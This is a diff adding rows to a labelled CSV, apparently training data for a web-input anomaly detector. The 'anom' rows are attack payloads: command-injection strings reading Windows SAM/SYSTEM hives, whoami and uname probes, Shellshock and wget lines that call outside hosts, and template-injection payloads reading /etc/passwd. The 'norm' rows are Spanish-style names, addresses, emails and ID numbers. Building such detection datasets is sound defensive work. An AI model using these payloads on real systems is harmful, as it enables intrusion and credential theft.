+type C:\Windows\repair\SYSTEM,anom
+| type C:\WINNT\repair\SAM,anom
+; type C:\WINNT\repair\SAM,anom
+& type C:\WINNT\repair\SAM,anom
+&& type C:\WINNT\repair\SAM,anom
+type C:\WINNT\repair\SAM,anom
+type C:\WINNT\repair\SYSTEM,anom
+| type %SYSTEMROOT%\repair\SAM,anom
+; type %SYSTEMROOT%\repair\SAM,anom
+& type %SYSTEMROOT%\repair\SAM,anom
+&& type %SYSTEMROOT%\repair\SAM,anom
+type %SYSTEMROOT%\repair\SAM,anom
+| type %SYSTEMROOT%\repair\SYSTEM,anom
+; type %SYSTEMROOT%\repair\SYSTEM,anom
+& type %SYSTEMROOT%\repair\SYSTEM,anom
+&& type %SYSTEMROOT%\repair\SYSTEM,anom
+type %SYSTEMROOT%\repair\SYSTEM,anom
+uname,anom
+;uname;,anom
+| uname -a,anom
+; uname -a,anom
+& uname -a,anom
+&& uname -a,anom
+uname -a,anom
+|/usr/bin/id,anom
+;|/usr/bin/id|,anom
+;/usr/bin/id|,anom
+$;/usr/bin/id,anom
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",anom
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,anom
+| wget http://crowdshield.com/.testing/rce.txt,anom
+& wget http://crowdshield.com/.testing/rce.txt,anom
+; wget https://crowdshield.com/.testing/rce_vuln.txt,anom
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),anom
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,anom
+wget https://crowdshield.com/.testing/rce_vuln.txt,anom
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),anom
+which curl,anom
+which gcc,anom
+which nc,anom
+which netcat,anom
+which perl,anom
+which python,anom
+which wget,anom
+whoami,anom
+| whoami,anom
+; whoami,anom
+' whoami,anom
+' || whoami,anom
+' & whoami,anom
+' && whoami,anom
+'; whoami,anom
+" whoami
+ || whoami",anom
+" | whoami
+ & whoami",anom
+" && whoami
+; whoami",anom
+$(`whoami`),anom
+& whoami,anom
+&& whoami,anom
+"{{ get_user_file(""C:\boot.ini"") }}",anom
+"{{ get_user_file(""/etc/hosts"") }}",anom
+"{{ get_user_file(""/etc/passwd"") }}",anom
+{{4+4}},anom
+{{4+8}},anom
+{{person.secret}},anom
+{{person.name}},anom
+{1} + {1},anom
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",anom
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},anom
+c/ caridad s/n,norm
+"campello, el",norm
+40184,norm
+1.44243E+15,norm
+nue37,norm
+nuda drudes,norm
+tufts3@joll.rs,norm
+22997112x,norm
+"c/ del ferrocarril, 152,",norm
+arenas de san juan,norm
+19245,norm
+2.07077E+15,norm
+fennell,norm
+d50allecido,norm
+1902,norm
+genny,norm
+03248i367ca,norm
+ulldemol bujeque,norm
+grubel8@albeiteria.kw,norm
+83497200r,norm
+plaa caudillo 60,norm
+martn de yeltes,norm
+1.76947E+15,norm
+maala8,norm
+cascabela,norm
+ludolfo,norm
+peuela sains,norm
+snerd@bwds.tj,norm
+15365381r,norm
+"c/ 57 15, 9g",norm
+regueras de arriba,norm
+8281,norm
+empeltre,norm
+7497,norm
+mckenney,norm
+estantalar,norm
+poma gozalbo,norm
+loti@ajuntamentbarcelona2-0.is,norm
+21924971z,norm
+"c/ huertas altas, 114",norm
+"sequera de haza, la",norm
+25260,norm
+8.75573E+15,norm
+kindra,norm
+h9655,norm
+josias,norm
+fonoll zurko,norm
+dunlap-leaud@videospornocaseros.ye,norm
+07408152j,norm
+"c/ aira de villaescusa 199, 1f",norm
+"pobla de montorns, la",norm
+9530,norm
+4.19037E+15,norm
+kong-que,norm
+5x8r0r,norm
+5599,norm
+goggin,norm
+indocto,norm
+serneo,norm
+plebs cadevall,norm
+marieau8@clementelr.nz,norm
+24314757p,norm
+cueva de montesinos 80 11-g,norm
+4742,norm
+3.36323E+15,norm
+xiangsen,norm
+correccionalmente,norm
+cleofs,norm
+01633578a,norm
+"europa, 58 2-f",norm
+21388,norm
+5.56221E+15,norm
+vasilopo,norm
+ladronzue_lo,norm
+4377,norm
+elbeze,norm
+cachapera,norm
+molledo basagaa,norm
+hibbert.bupp@hojadecalculo.com.mil,norm
+56163821y,norm
+carretera de las ermitas 188,norm
+zarratn,norm
+6.34123E+15,norm
+lauriaul,norm
+er3t3e1,norm
+atanaspulos,norm
+nype.shafer@canovash.bv,norm
+38355013y,norm
+"plaa catalunya 124, 5-b",norm
+merindad de ro ubierna,norm
+19312,norm
+1.43759E+15,norm
+robieux,norm
+cuatriduana,norm
+1565,norm
+darby,norm
+ti7o,norm
+folch pintado,norm
+thalasso.chappell@titulosoficiales.jp,norm
+00474767r,norm
+manuel pereira s/n 12?a,norm
+3.50022E+14,norm
+esther,norm
+labranto,norm
+julisa,norm
+pelez bastus,norm
+pianka@noviasteresapalacios.mc,norm
+03266253t,norm
+"c/ doctor ferran, 193",norm
+38787,norm
+9.92218E+14,norm
+fitzgera,norm
+13g0e7at42a,norm
+5788,norm
+kinnie,norm
+ret4ne3or,norm
+graziana,norm
+vettenranta@infopromo.az,norm
+"el caaveral 130, 5-f",norm
+16648,norm
+9.13956E+15,norm
+valina,norm
+07u8e37ia,norm
+yoselie,norm
+pool echenique,norm
+07901950r,norm
+"calle holanda 146,",norm
+"tres villas, las",norm
+39638,norm
+5.42674E+15,norm
+patrica0,norm
+portal,norm
+mankowsk,norm
+4a39c44a,norm
+marino,norm
+bow@whitepearlresort.pl,norm
+01472954b,norm
+c/ garcia morente 129,norm
+adradas,norm
+18417,norm
+2.53384E+15,norm
+smelters,norm
+tamboreo,norm
+natn,norm
+lamas,norm
+sipperly.nakamoto@ceramicasmio.ht,norm
+68201502q,norm
+carretera 200 hasta km. 1 barra de mio 175,norm
+manzanilla,norm
+36680,norm
+1.18171E+15,norm
+jalaie,norm
+*r6t58a,norm
+1613,norm
+joelly,norm
+r8cid0va,norm
+flaviano,norm
+oshea_knowles@tiaherminia.gh,norm
+14977979b,norm
+"calle del llenguadoc s/n, 6e",norm
+pujalt,norm
+45183,norm
+2.69448E+14,norm
+kristel,norm
+d2s7sp79ro,norm
+reiji,norm
+estolano boget,norm
+spiegel-haake@convention.no,norm
+62145911a,norm
+"travesia barrionuevo, 49",norm
+turcia,norm
+7.73869E+15,norm
+daisey,norm
+r92e1*56e,norm
+2925,norm
+doris,norm
+pu6ue97,norm
+bergad faix,norm
+sibirskaia@euskalcasino.es,norm
+72367579b,norm
+"c/ lope de rueda s/n, 9-f",norm
+alcntar,norm
+1.72128E+15,norm
+lozier,norm
+alguese,norm
+starr-fjelmose@cdgranadabaila.travel,norm
+30482828p,norm
+"c/ ulises 17,",norm
+47815,norm
+rube,norm
+enlutada,norm
+2354,norm
+blount,norm
+sugesto,norm
+raian,norm
+suau,norm
+germain@elcorteitaliano.cat,norm
+78977050h,norm
+"c/ de la sabina, s/n 8?b",norm
+betelu,norm
+24224,norm
+mcglynn,norm
+midkiff_mikuni@directoriogratuito.kh,norm
+58772485x,norm
+"calle rascafria, 103,",norm
+gimialcn,norm
+39515,norm
+3.5822E+15,norm
+sprouse,norm
+zanquita,norm
+1827,norm
+addons,norm
+14ab214c6n,norm
+karla,norm
+jauregui cortines,norm
+quartet@cabare.com.cs,norm
+86800649y,norm
+"paratge lila 30, 10?c",norm
+espluga de francol l',norm
+9.09145E+15,norm
+dyck,norm
+acre,norm
+pereda barrio,norm
+barrymore@hipermadrid.pe,norm
